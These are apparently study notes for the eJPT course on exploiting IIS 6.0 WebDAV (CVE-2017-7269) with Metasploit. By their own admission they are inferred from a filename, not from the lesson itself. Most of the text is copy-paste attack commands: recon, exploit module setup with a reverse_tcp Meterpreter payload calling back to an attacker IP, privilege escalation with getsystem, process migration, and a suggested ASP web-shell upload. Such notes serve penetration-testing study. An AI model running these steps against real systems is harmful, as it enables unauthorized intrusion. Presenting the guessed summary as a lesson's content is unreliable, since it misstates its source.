# Exploiting WebDAV With Metasploit (eJPT Study Notes)

Note: No transcript was provided. The following is a conservative, exam-oriented summary inferred from the filename and course folder. It outlines a common Windows WebDAV (IIS) exploitation workflow with Metasploit, typically targeting IIS 6.0 WebDAV (CVE-2017-7269).

## What the video covers (Introduction / big picture)
- Identifying and confirming WebDAV on a Windows IIS target.
- Using Metasploit to verify and exploit a vulnerable WebDAV service.
- Gaining a Meterpreter session and basic post-exploitation steps.
- Practical enumeration and verification prior to exploitation.

## Flow (ordered)
1. Initial enumeration of HTTP/HTTPS to detect IIS and potential WebDAV.
2. Confirm WebDAV via HTTP methods (OPTIONS/PROPFIND) or Metasploit scanner.
3. Identify suitable Metasploit module (commonly IIS 6.0 WebDAV ScStoragePathFromUrl).
4. Configure exploit options (RHOSTS, RPORT, LHOST, TARGETURI, payload).
5. Run check (if available), then launch the exploit.
6. Interact with shell/Meterpreter; stabilize and escalate if possible.
7. Quick post-exploitation verification (getuid, sysinfo), optional privilege escalation.
8. Document findings and clean up.

## Tools highlighted
- Nmap (service/version detection, NSE scripts)
- curl (manual HTTP methods probing)
- Metasploit Framework (msfconsole)
  - auxiliary/scanner/http/webdav_scanner (or http-methods check)
  - exploit/windows/iis/iis_webdav_scstoragepathfromurl (CVE-2017-7269)
  - Meterpreter (post-exploitation basics)

## Typical command walkthrough (detailed, copy-paste friendly)

Replace TARGET and LHOST with your values.

1) Recon and confirmation

```bash
# Quick service scan
nmap -sC -sV -p80,443 -oN nmap_web.txt TARGET

# Check HTTP headers/banners
curl -I http://TARGET/

# Check allowed methods (look for PROPFIND, MOVE, etc.)
curl -X OPTIONS -i http://TARGET/

# Optional: NSE scripts for WebDAV
nmap -p80 --script http-methods,http-webdav-scan -oN nmap_webdav.txt TARGET
```

2) Metasploit: detect and exploit

```bash
msfconsole -q

# Optional global settings (handy for repeated use)
setg RHOSTS TARGET
setg RPORT 80
setg LHOST YOUR_ATTACKER_IP

# Identify WebDAV capabilities (scanner)
search type:auxiliary webdav
use auxiliary/scanner/http/webdav_scanner
set RHOSTS TARGET
set RPORT 80
run
back

# Exploit: IIS 6.0 WebDAV ScStoragePathFromUrl (CVE-2017-7269)
search type:exploit webdav iis
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
show options

# Required options
set RHOSTS TARGET
set RPORT 80
set TARGETURI /
set LHOST YOUR_ATTACKER_IP
set PAYLOAD windows/meterpreter/reverse_tcp
set VERBOSE true

# Safety check (if supported by module)
check

# Launch exploit (foreground)
run

# Or run in background as a job
# exploit -j
```

3) Post-exploitation basics

```text
# List and interact with session
sessions -l
sessions -i 1

# Quick host/user context
getuid
sysinfo
ipconfig

# Try to elevate (depends on privileges)
getsystem

# Stabilize by migrating to a reliable process (pick a GUI/user process where possible)
ps
migrate <PID>

# File system access (examples)
pwd
ls
cd C:\\
```

4) Cleanup (optional)

```text
# Background and close session if needed
background
sessions -K   # kills all sessions
```

## Practical tips
- Confirm target version: IIS/6.0 with WebDAV enabled is a strong indicator for CVE-2017-7269.
- Always run check before exploit when available; this vulnerability can be crash-prone on some builds.
- If the Meterpreter payload fails, try windows/shell/reverse_tcp or adjust LHOST/LPORT and firewall assumptions.
- Set TARGETURI to the correct Web root (often “/”). If WebDAV is enabled under a virtual directory, point to it.
- Use Nmap’s http-methods and http-webdav-scan to verify methods like PROPFIND/LOCK/UNLOCK.
- If exploitation fails but WebDAV is present, consider alternative routes (e.g., PUT/MOVE to upload an ASP shell if methods allow), though that may require different tooling (cadaver/davtest); the video likely focuses on the Metasploit RCE module.
- After shell, quickly migrate to a stable process to avoid losing the session when IIS recycles worker processes.
- eJPT scope: focus on reliable exploitation, basic validation, and concise reporting over deep persistence.

## Minimal cheat sheet (one-screen flow)

```bash
# Recon
nmap -sC -sV -p80,443 TARGET
nmap -p80 --script http-methods,http-webdav-scan TARGET
curl -X OPTIONS -i http://TARGET/

# Metasploit
msfconsole -q
setg RHOSTS TARGET
setg RPORT 80
setg LHOST YOUR_ATTACKER_IP

use auxiliary/scanner/http/webdav_scanner
run
back

use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS TARGET
set RPORT 80
set TARGETURI /
set LHOST YOUR_ATTACKER_IP
set PAYLOAD windows/meterpreter/reverse_tcp
check
run

# Post
sessions -i 1
getuid
sysinfo
getsystem
ps
migrate <PID>
```

## Summary
- The lesson demonstrates discovering a WebDAV-enabled IIS host and exploiting it using Metasploit, most commonly via the IIS 6.0 WebDAV ScStoragePathFromUrl vulnerability (CVE-2017-7269).
- Key steps: verify WebDAV with Nmap/curl or Metasploit scanner; configure and run the Metasploit exploit; obtain a Meterpreter session; stabilize and perform quick post-exploitation checks.
- Focus on reliable, repeatable commands and verification to match eJPT expectations.